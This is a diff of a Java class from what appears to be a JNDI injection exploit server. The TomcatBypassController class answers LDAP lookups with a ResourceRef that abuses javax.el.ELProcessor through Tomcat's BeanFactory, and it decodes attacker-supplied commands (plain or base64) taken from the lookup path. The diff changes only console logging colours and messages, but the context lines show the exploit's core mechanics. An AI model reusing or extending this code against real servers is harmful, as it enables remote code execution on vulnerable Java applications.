@@ -13,6 +13,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
+import org.fusesource.jansi.Ansi;
 
 import javax.naming.StringRefAddr;
 import java.io.IOException;
@@ -30,8 +31,6 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for |@" + base + "  @|green with javax.el.ELProcessor payload|@"));
-            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String");
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
@@ -78,6 +77,7 @@ public class TomcatBypassController implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
+        System.out.println("- JNDI Local Refenrence Links ");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
@@ -86,7 +86,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  PaylaodType: " + payloadType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -104,7 +104,7 @@ public class TomcatBypassController implements LdapController {
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                 params = new String[]{cmd};
             }
 
@@ -113,7 +113,7 @@ public class TomcatBypassController implements LdapController {
                 byte[]   decodedBytes = Util.base64Decode(cmd1);
                 String   cmd          = new String(decodedBytes);
                 String[] cmdArray     = cmd.split(" ");
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
                 params = cmdArray;
             }
 
